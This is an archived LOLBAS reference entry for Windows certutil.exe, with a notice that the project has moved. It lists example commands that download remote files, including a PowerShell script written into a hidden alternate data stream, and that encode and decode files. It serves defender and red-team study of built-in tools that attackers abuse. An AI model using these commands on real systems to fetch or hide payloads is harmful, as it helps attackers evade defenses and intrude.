# UPDATE BOOKMARKS - PROJECT MOVED TO A DEDICATED PROJECT SITE. THIS SITE WILL NOT BE UPDATED ANYMORE, BUT WILL BE KEPT FOR HISTORICAL REASONS.
New site: https://github.com/LOLBAS-Project/LOLBAS
Web portal: https://lolbas-project.github.io/ 
## Certutil.exe

* Functions: Download, Add ADS, Decode, Encode

```
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe    
    
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt    
    
certutil -encode inputFileName encodedOutputFileName   
    
certutil -decode encodedInputFileName decodedOutputFileName
```

Acknowledgements:
* Matt Graeber - @mattifestation
* Moriarty - @Moriarty2016

Code sample:
* 

Resources:
* https://twitter.com/Moriarty_Meng/status/984380793383370752
* https://twitter.com/mattifestation/status/620107926288515072

Full path:
```
c:\windows\system32\certutil.exe
c:\windows\sysWOW64\certutil.exe
```

Notes:



 
